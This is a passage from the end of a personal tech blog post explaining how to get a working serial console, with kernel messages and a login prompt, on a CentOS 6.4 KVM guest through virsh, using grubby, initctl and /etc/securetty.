</span><span class='line'><span class="s">EOL</span>
</span><span class='line'><span class="nv">$ </span>grubby --update-kernel<span class="o">=</span>ALL --args<span class="o">=</span><span class="s1">&#39;console=ttyS0,115200n8 console=tty0&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, you can reboot the server and connect to the domains console via virsh. If all went well, you <em>should</em> be seeing kernel messages and eventually service starts up&rsquo;s, followed by a login prompt in the console.</p>

<p>If rebooting is not a option, you can enable it on the fly, after saving <code>ttyS0.conf</code> with <code>$ initctl start ttyS0</code> as root.</p>

<p>The <code>grubby</code> command is not mandatory, however this is what allows you to see the kernel messages as the guest boots. I <strong>highly</strong> recommend it.</p>

<h3>I have console, but can&rsquo;t log in as root</h3>

<p>If you followed this guide, then that would in fact be the case. Logging in directly as root is not something I would recommend. Rather log in as a unprivileged user, and su/sudo up to root. In some cases however it is actually necessary. So, to fix this problem, simply add <code>ttyS0</code> as a &ldquo;securetty&rdquo; in <code>/etc/securetty</code> by running: <code>$ echo "ttyS0" &gt;&gt; /etc/securetty</code>. This will allow root logins via the virsh console.</p>

<h3>serial.conf has the answers</h3>

<p>If you are looking for more in-depth explanations as to how this works, I suggest you take a look at <code>/etc/init/serial.conf</code> (again on CentOS 6.4). You&rsquo;ll notice the configuration for <code>ttyS0.conf</code> also comes from here :)</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/5">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/3">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">knock-knock who’s there?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/09/18/from-persistence/">From Persistence, to pain, to PWN</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/17/kali-linux-oracle-support/">Kali Linux Oracle Support</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/15/taming-the-troll/">taming (actually just solving) the troll</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/09/beating-xerxes2/">Beating Xerxes 2 (no, not the Persian King)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/07/flick-can-you-find-the-flag/">flick - can you find the flag?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/20/hell-would-just-not-freeze-over/">Hell would just not freeze over!</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/17/climbing-the-skytower/">Climbing the SkyTower</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/">dnsfilexfer - yet another take on file transfer via DNS</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/">/root/flag.txt - Solving the Relativity Vulnerable VM</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating&#8230;</li>
  </ul>
  
  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'leonjza',
            count: 8,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - Leon Jacobs -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
